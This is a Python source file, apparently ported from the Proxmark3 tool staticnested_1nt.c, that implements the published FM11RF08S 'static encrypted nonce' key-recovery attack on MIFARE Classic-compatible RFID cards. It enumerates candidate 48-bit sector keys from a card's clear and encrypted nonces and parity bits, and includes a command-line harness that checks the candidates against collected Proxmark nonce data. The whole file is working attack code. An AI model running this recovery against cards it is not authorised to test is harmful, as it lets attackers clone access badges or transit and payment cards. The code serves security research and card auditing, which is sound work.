#!/usr/bin/env python3
"""FM11RF08S "static encrypted nonce" key recovery (Teuwen 2024, eprint 2024/1275).

Port of proxmark3 tools/mfc/card_only/staticnested_1nt.c. The card's NESTED nonce is static, so
with the backdoor key we learn the CLEAR static nonce nt (decrypt the backdoor-encrypted nonce),
and a normal nested auth gives the SAME nonce encrypted under the real key (nt_enc) plus its parity.
candidates(uid, nt, nt_enc, nt_par_enc) enumerates the key candidates; one static nonce gives tens
of thousands, cut to a unique key by key-reuse / verifying against the card.
Derived from Proxmark3 (C) Proxmark3 contributors, GPL-3.0-or-later (staticnested_1nt.c by Philippe Teuwen); see CREDITS.md.
"""
from crapto1 import lfsr_recovery32, lfsr_rollback_word, crypto1_get_lfsr
from crypto1 import Crypto1, odd_parity_bit


def candidates(uid, nt, nt_enc, nt_par_enc):
    """Key candidates from one static encrypted nonce. nt_par_enc = the 4 raw encrypted parity bits
    of nt_enc (bit3..bit0 for nonce bytes 0..3); only the last (bit0) filters. Returns a list of
    48-bit keys."""
    ks1 = nt ^ nt_enc
    inn = uid ^ nt
    lastpar1 = odd_parity_bit(nt & 0xFF)  # parity of the last clear-nt byte
    out = []
    for odd, even in lfsr_recovery32(ks1, inn):
        s = [odd, even]
        lfsr_rollback_word(s, inn, 0)
        key = crypto1_get_lfsr(s[0], s[1])
        # Filter on the last parity bit: re-run the cipher, check its keystream parity bit.
        c = Crypto1(key.to_bytes(6, "big"))
        c.word(inn, False)
        ks2 = c.word(0, False)
        kslastp = (ks2 >> 24) & 1
        if lastpar1 == ((nt_par_enc & 1) ^ kslastp):
            out.append(key)
    return out


if __name__ == "__main__":
    import json
    import sys

    # Validate against a proxmark nonce JSON (hf mf isen --collect_fm11rf08s) + a known key.
    # Usage: staticnested.py NONCES.json UIDHEX SECTOR a|b [EXPECTED_KEY_HEX]
    path, uidhex, sec, kt = sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4]
    expect = sys.argv[5].lower() if len(sys.argv) > 5 else None
    d = json.load(open(path))
    uid = int(uidhex, 16)
    nt = int(d["nt"][sec][kt], 16)
    nt_enc = int(d["nt_enc"][sec][kt], 16)
    par_err = d["par_err"][sec][kt]  # 4-char binary, error vs plaintext parity
    # raw enc parity = par_err ^ oddparity8(nt_enc byte)
    bits = 0
    for i in range(4):
        b = (nt_enc >> (24 - 8 * i)) & 0xFF
        bits = (bits << 1) | (int(par_err[i]) ^ odd_parity_bit(b))
    print(f"uid={uid:08x} sec {sec}{kt} nt={nt:08x} nt_enc={nt_enc:08x} par={par_err} "
          f"nt_par_enc={bits:04b} ks1={nt ^ nt_enc:08x}")
    ks = candidates(uid, nt, nt_enc, bits)
    print(f"{len(ks)} candidates")
    if expect is not None:
        hit = any(f"{k:012x}" == expect for k in ks)
        print(f"expected {expect}: {'FOUND' if hit else 'NOT FOUND'}")
